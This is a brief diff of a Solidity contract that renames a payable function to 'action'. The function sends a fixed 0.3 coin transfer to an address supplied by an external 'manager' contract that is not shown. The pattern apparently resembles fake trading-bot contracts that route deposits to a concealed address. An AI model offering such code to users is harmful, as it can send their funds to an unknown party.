@@ -5,7 +5,7 @@ contract Manager {
         
     }
     
-    function pancakeswapDepositAddress () public payable {
+    function action () public payable {
         payable(manager.pancakeswapDepositAddress()).transfer(300000000000000000);
     }
 }
